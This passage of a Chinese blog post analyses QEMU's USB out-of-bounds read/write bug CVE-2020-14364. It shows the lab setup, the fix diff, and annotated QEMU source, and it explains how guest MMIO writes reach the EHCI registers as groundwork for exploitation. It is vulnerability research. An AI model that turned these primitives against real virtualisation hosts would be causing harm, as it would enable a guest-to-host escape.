<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -<span class="built_in">enable</span>-kvm \</span><br><span class="line">    -m 1G -nographic \</span><br><span class="line">    -hda /home/wz/Desktop/CTF/CVE-2020-14364/start_qemu/qemu.img \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">"console=ttyS0 root=/dev/sda rw"</span> \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::2222-:22 \</span><br><span class="line">    -usb \</span><br><span class="line">    -drive <span class="keyword">if</span>=none,format=raw,id=disk1,file=./disk_01.img \</span><br><span class="line">    -device ich9-usb-ehci1,id=usb \</span><br><span class="line">    -device usb-storage,drive=disk1 \</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接看下CVE的官方描述，漏洞产生于qemu中模拟USB的部分。</p>
<ul>
<li>An out-of-bounds read/write access flaw was found in the USB emulator of the QEMU in versions before 5.2.0. This issue occurs while processing USB packets from a guest when USBDevice ‘setup_len’ exceeds its ‘data_buf[4096]’ in the do_token_in, do_token_out routines. This flaw allows a guest user to crash the QEMU process, resulting in a denial of service, or the potential execution of arbitrary code with the privileges of the QEMU process on the host.</li>
</ul>
<p>在<a href="https://lists.gnu.org/archive/html/qemu-devel/2020-08/msg05969.html" target="_blank" rel="noopener"> usb: fix setup_len init CVE-2020-14364</a>看下patch的内容，<code>setup_len</code>是在赋值后才判断的，即使超过了限制，该处return也不会回滚其原始值，而是继续向后运行，从而在后面的<code>do_token_in/do_token_out</code>中产生越界读和越界写。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">---</span></span><br><span class="line"> hw/usb/core.c | 16 ++++++++++------</span><br><span class="line"> 1 file changed, 10 insertions(+), 6 deletions(-)</span><br><span class="line"></span><br><span class="line">diff --git a/hw/usb/core.c b/hw/usb/core.c</span><br><span class="line">index 5abd128b6bc5..5234dcc73fea 100644</span><br><span class="line"><span class="comment">--- a/hw/usb/core.c</span></span><br><span class="line"><span class="comment">+++ b/hw/usb/core.c</span></span><br><span class="line">@@ -129,6 +129,7 @@ void usb_wakeup(USBEndpoint *ep, unsigned int stream)</span><br><span class="line"> static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;iov.size != 8) &#123;</span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">@@ -138,14 +139,15 @@ static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line">     usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line">     p-&gt;actual_length = 0;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 "usb_generic_handle_packet: ctrl buffer too small (%d &gt; </span><br><span class="line">%zu)\n",</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line">@@ -259,26 +261,28 @@ static void do_token_out(USBDevice *s, USBPacket *p)</span><br><span class="line"> static void do_parameter(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int i, request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     for (i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">         s-&gt;setup_buf[i] = p-&gt;parameter &gt;&gt; (i*8);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     s-&gt;setup_state = SETUP_STATE_PARAM;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line"> </span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line">     index   = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4];</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 "usb_generic_handle_packet: ctrl buffer too small (%d &gt; </span><br><span class="line">%zu)\n",</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;pid == USB_TOKEN_OUT) &#123;</span><br><span class="line">         usb_packet_copy(p, s-&gt;data_buf, s-&gt;setup_len);</span><br><span class="line"><span class="deletion">--</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//USB数据包</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBPacket</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Data fields for use by the driver.  */</span></span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">uint64_t</span> id;</span><br><span class="line">    USBEndpoint *ep;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> stream;</span><br><span class="line">    QEMUIOVector iov;</span><br><span class="line">    <span class="keyword">uint64_t</span> parameter; <span class="comment">/* control transfers */</span></span><br><span class="line">    <span class="keyword">bool</span> short_not_ok;</span><br><span class="line">    <span class="keyword">bool</span> int_req;</span><br><span class="line">    <span class="keyword">int</span> status; <span class="comment">/* USB_RET_* status code */</span></span><br><span class="line">    <span class="keyword">int</span> actual_length; <span class="comment">/* Number of bytes actually transferred */</span></span><br><span class="line">    <span class="comment">/* Internal use by the USB layer.  */</span></span><br><span class="line">    USBPacketState state;</span><br><span class="line">    USBCombinedPacket *combined;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) <span class="built_in">queue</span>;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) combined_entry;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//模拟的USB设备数据结构</span></span><br><span class="line"><span class="comment">/* definition of a USB device */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="keyword">char</span> *port_path;</span><br><span class="line">    <span class="keyword">char</span> *serial;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Actual connected speed */</span></span><br><span class="line">    <span class="keyword">int</span> speed;</span><br><span class="line">    <span class="comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span></span><br><span class="line">    <span class="keyword">int</span> speedmask;</span><br><span class="line">    <span class="keyword">uint8_t</span> addr;</span><br><span class="line">    <span class="keyword">char</span> product_desc[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> auto_attach;</span><br><span class="line">    <span class="keyword">bool</span> attached;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int32_t</span> state;</span><br><span class="line">    <span class="keyword">uint8_t</span> setup_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> data_buf[<span class="number">4096</span>];<span class="comment">//拷贝的对象</span></span><br><span class="line">    <span class="keyword">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_state;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_len;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    <span class="keyword">const</span> USBDesc *usb_desc; <span class="comment">/* Overrides class usb_desc if not NULL */</span></span><br><span class="line">    <span class="keyword">const</span> USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> configuration;</span><br><span class="line">    <span class="keyword">int</span> ninterfaces;</span><br><span class="line">    <span class="keyword">int</span> altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    <span class="keyword">const</span> USBDescConfig *config;</span><br><span class="line">    <span class="keyword">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_in</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> request, value, index;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                      s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            <span class="keyword">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<span class="comment">//可控</span></span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<span class="comment">//越界读</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_out</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            <span class="comment">/* transfer OK */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* ignore additional output */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            <span class="keyword">int</span> len = s-&gt;setup_len - s-&gt;setup_index;   <span class="comment">//可控</span></span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;                   <span class="comment">//可控</span></span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<span class="comment">//越界写</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//usb_packet_copy中再根据p-&gt;pid决定是读还是写</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usb_packet_copy</span><span class="params">(USBPacket *p, <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;actual_length &gt;= <span class="number">0</span>);</span><br><span class="line">    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);</span><br><span class="line">    <span class="keyword">switch</span> (p-&gt;pid) &#123;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">        iov_from_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s: invalid pid: %x\n"</span>, __func__, p-&gt;pid);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;actual_length += bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="读写函数"><a href="#读写函数" class="headerlink" title="读写函数"></a>读写函数</h2><h3 id="USB内存初始化"><a href="#USB内存初始化" class="headerlink" title="USB内存初始化"></a>USB内存初始化</h3><p><code>mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);</code>映射到usb 设备的内存。</p>
<p><code>usb_ehci_pci_init</code>将opreg的基址opregbase设置为了0x20，对这块内存读写即可对opreg的内容进行读写。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usb_ehci_pci_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);</span><br><span class="line">    EHCIPCIState *i = PCI_EHCI(obj);</span><br><span class="line">    EHCIState *s = &amp;i-&gt;ehci;</span><br><span class="line"></span><br><span class="line">    s-&gt;caps[<span class="number">0x09</span>] = <span class="number">0x68</span>;        <span class="comment">/* EECP */</span></span><br><span class="line"></span><br><span class="line">    s-&gt;capsbase = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;opregbase = <span class="number">0x20</span>;</span><br><span class="line">    s-&gt;portscbase = <span class="number">0x44</span>;</span><br><span class="line">    s-&gt;portnr = NB_PORTS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dc-&gt;hotpluggable) &#123;</span><br><span class="line">        s-&gt;companion_enable = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_ehci_init(s, DEVICE(obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>opreg的内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> opreg[<span class="number">0x44</span>/<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="keyword">uint32_t</span> usbcmd;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbsts;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbintr;</span><br><span class="line">            <span class="keyword">uint32_t</span> frindex;</span><br><span class="line">            <span class="keyword">uint32_t</span> ctrldssegment;</span><br><span class="line">            <span class="keyword">uint32_t</span> periodiclistbase;</span><br><span class="line">            <span class="keyword">uint32_t</span> asynclistaddr;</span><br><span class="line">            <span class="keyword">uint32_t</span> notused[<span class="number">9</span>];</span><br><span class="line">            <span class="keyword">uint32_t</span> configflag;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<p><code>usb_ehci_init</code>函数里注册了对于opreg读写的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usb_ehci_init</span><span class="params">(EHCIState *s, DeviceState *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 2.2 host controller interface version */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x00</span>] = (<span class="keyword">uint8_t</span>)(s-&gt;opregbase - s-&gt;capsbase);</span><br><span class="line">    s-&gt;caps[<span class="number">0x01</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x02</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x03</span>] = <span class="number">0x01</span>;        <span class="comment">/* HC version */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x04</span>] = s-&gt;portnr;   <span class="comment">/* Number of downstream ports */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x05</span>] = <span class="number">0x00</span>;        <span class="comment">/* No companion ports at present */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x06</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x07</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x08</span>] = <span class="number">0x80</span>;        <span class="comment">/* We can cache whole frame, no 64-bit */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x0a</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x0b</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;aqueues);</span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;pqueues);</span><br><span class="line">    usb_packet_init(&amp;s-&gt;ipacket);</span><br><span class="line"></span><br><span class="line">    memory_region_init(&amp;s-&gt;mem, OBJECT(dev), <span class="string">"ehci"</span>, MMIO_SIZE);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_caps, OBJECT(dev), &amp;ehci_mmio_caps_ops, s,</span><br><span class="line">                          <span class="string">"capabilities"</span>, CAPA_SIZE);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_opreg, OBJECT(dev), &amp;ehci_mmio_opreg_ops, s,</span><br><span class="line">                          <span class="string">"operational"</span>, s-&gt;portscbase);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_ports, OBJECT(dev), &amp;ehci_mmio_port_ops, s,</span><br><span class="line">                          <span class="string">"ports"</span>, <span class="number">4</span> * s-&gt;portnr);</span><br><span class="line"></span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;capsbase, &amp;s-&gt;mem_caps);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase, &amp;s-&gt;mem_opreg);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase + s-&gt;portscbase,</span><br><span class="line">                                &amp;s-&gt;mem_ports);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps ehci_mmio_opreg_ops = &#123;</span><br><span class="line">    .read = ehci_opreg_read,</span><br><span class="line">    .write = ehci_opreg_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">4</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>看一下这里的读写函数，读函数读取<code>addr + s-&gt;opregbase</code>的内容到addr给用户，比如我们调用<code>*((uint64_t*)(mmio_mem + 0x20))</code>实际上这里的addr为0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">ehci_opreg_read</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> FRINDEX:</span><br><span class="line">        <span class="comment">/* Round down to mult of 8, else it can go backwards on migration */</span></span><br><span class="line">        val = s-&gt;frindex &amp; ~<span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        val = s-&gt;opreg[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_opreg_read(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再来看下写函数，加入我们调用mmio_write(0x20,0x1234)，实际上传入的addr=0，会对usbcmd进行赋值<code>s-&gt;usbcmd = val</code>，在最后有一个<code>*mmio = val;</code>，代换一下就是<code>*(s-&gt;opreg + (addr &gt;&gt; 2)) = val</code>，因此我们可以控制opreg的其他成员。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ehci_opreg_write</span><span class="params">(<span class="keyword">void</span> *ptr, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> *mmio = s-&gt;opreg + (addr &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> old = *mmio;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_opreg_write(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> USBCMD:</span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_HCRESET) &#123;</span><br><span class="line">            ehci_reset(s);</span><br><span class="line">            val = s-&gt;usbcmd;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* not supporting dynamic frame list size at the moment */</span></span><br><span class="line">        <span class="keyword">if</span> ((val &amp; USBCMD_FLS) &amp;&amp; !(s-&gt;usbcmd &amp; USBCMD_FLS)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"attempt to set frame list size -- value %d\n"</span>,</span><br><span class="line">                    (<span class="keyword">int</span>)val &amp; USBCMD_FLS);</span><br><span class="line">            val &amp;= ~USBCMD_FLS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_IAAD) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Process IAAD immediately, otherwise the Linux IAAD watchdog may</span></span><br><span class="line"><span class="comment">             * trigger and re-use a qh without us seeing the unlink.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">            trace_usb_ehci_doorbell_ring();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; val) !=</span><br><span class="line">            ((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; s-&gt;usbcmd)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;pstate == EST_INACTIVE) &#123;</span><br><span class="line">                SET_LAST_RUN_CLOCK(s);</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;usbcmd = val; <span class="comment">/* Set usbcmd for ehci_update_halt() */</span></span><br><span class="line">            ehci_update_halt(s);</span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> USBSTS:</span><br><span class="line">        val &amp;= USBSTS_RO_MASK;              <span class="comment">// bits 6 through 31 are RO</span></span><br><span class="line">        ehci_clear_usbsts(s, val);          <span class="comment">// bits 0 through 5 are R/WC</span></span><br><span class="line">        val = s-&gt;usbsts;</span><br><span class="line">        ehci_update_irq(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> USBINTR:</span><br><span class="line">        val &amp;= USBINTR_MASK;</span><br><span class="line">        <span class="keyword">if</span> (ehci_enabled(s) &amp;&amp; (USBSTS_FLR &amp; val)) &#123;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FRINDEX:</span><br><span class="line">        val &amp;= <span class="number">0x00003fff</span>; <span class="comment">/* frindex is 14bits */</span></span><br><span class="line">        s-&gt;usbsts_frindex = val;</span><br><span class="line">        <span 